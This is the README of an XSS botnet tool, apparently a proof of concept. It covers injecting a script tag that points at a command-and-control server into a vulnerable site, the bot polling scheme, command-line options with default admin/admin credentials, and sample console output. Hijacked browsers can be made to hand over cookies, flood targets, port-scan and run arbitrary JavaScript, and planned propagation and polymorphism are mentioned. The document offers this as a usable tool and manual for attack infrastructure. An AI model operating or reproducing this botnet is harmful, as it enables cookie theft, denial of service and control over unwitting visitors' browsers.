====================
=    XSS Botnet    =
====================

[+] Purpose
XSS exploitation becomes more and more powerful.  This
small piece of code intends to demonstrate that simple
vulnerability  can  be  leveraged  to  build  a  fully 
functional dynamic botnet.
After 2 years of conferencing about this, it should be 
considered  that  people  concerned are  now aware and 
accordingly setup appropriate defenses...

[+] Exploitation schema

> Actors
Victim: the target browsers. 
Goat:   the vulnerable web application which relays the
        attack
CC:     the command and control system

> CC access
CC esposes 2 URIs:
- /admin : for admin access
- /inject: for bots connections
* Note: these urls can be changed to prevent filtering

> Operations
The script is running in the CC. The Goat is  injected 
with a code pointing at the injection URL.
<script src="--injection url--"></script>
Victim gets de code from the CC and regularly connects
back to:
- provide feedback froml previous command
- get new command to execute if any

Simple, efficient.

[+] Structure and internals overview
The best way is to have a look at the code...

But more or less, the main piece of code downloaded by
the victim is a <script> object child of the <head> of 
the  document.   This  object  is  regularly   updated 
(actually  destroyed  and  rebuilt, but who care) wich
content is built by calling the /inject URL of the CC.
Default timeframe for bot to CC connection is 6500 ms.
This value can be changed from the command line.

A session is maintained between the bot and the CC via
a query string parameter which default name is set  to
SessionID (which can be changed to prevent filtering).

So, all together, once a browser gets  compromised  it
connects to the injection URL, gets a  Session ID  and 
the piece of code for default action. It  then appears
in the admin interface (see below) and  other  actions 
can be defined by the admin of the botnet.

[+] Start the bot
# perl xss-bot.pl
Options:
-v              verbose

-p=<port>       port to listen on
                default: 80
			  
-a=<uri>        admin uri
                default: /admin
			  
-i=<uri>        inject uri
                default: /inject
			  
-l=<login>      admin login
                default: admin
			  
-w=<password>   admin password
                default: admin
			  
-s=<sessionID>  session ID parameter
                default: sessionID

#perl xss-bot.pl -v -p=81

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!    Welcome on XSS-BOT   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Launch Options
--------------
VERBOSE                  = 1
DEBUG                    = 0
PASSWORD                 = admin
REMOTEIP                 =
BOTSESSION               = botSessionID
SYNC                     = /sync
FATHER                   =
LOGIN                    = admin
LOADTIMER                = 12000
HEARTBEAT                = 6500
ADMIN                    = /admin
INJECT                   = /inject
SESSION                  = sessionID
PORT                     = 81

192.168.80.1 connected - Request: GET /inject HTTP/1.1
10.1.3.7 connected - Request: GET /inject?sessionID=TNA46KU3FW4 HTTP/1.1

[+] Admin interface
Connect  to  the admin URL with the proper credentials
(default: admin/admin).

List  of  connected  bots  is provided  in the "Active 
Session List" as well as the current action.

+++ Active Sessions List +++

+---- Bot IP -----+---- Action ----+---- Params ---->
| 10.1.3.7        | Custom         | navigator.appName
+-----------------+----------------+---------------->

Default action to be performed upon bot connection  is 
defined in the "Automated Action" block.

Action can be performed on connected  bots in the "Take 
Control" section.

Browser responses, when relevant, are displayed in  the 
"Bots Response" section.

++++++ Bots Responses ++++++

12-23 12:03:59 -> 10.1.3.7 : 5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko
12-23 12:01:30 -> 10.1.3.7 : Netscape

[+] Actions
Bots  can  be  controled  to perform the actions listed 
below:
- Grab cookies
- Flood target
- Redirect to another page
- Send popup
- Execute portscan
- Execute any custom JavaScript code

[+] Next
Lots of things are left to be implemented:
- Bot automated propagation
- Polymorphic injections for propagation
- CC hierarchical structure to make it undestructible

Some are already partly coded. Some are left to do.

Enjoy!
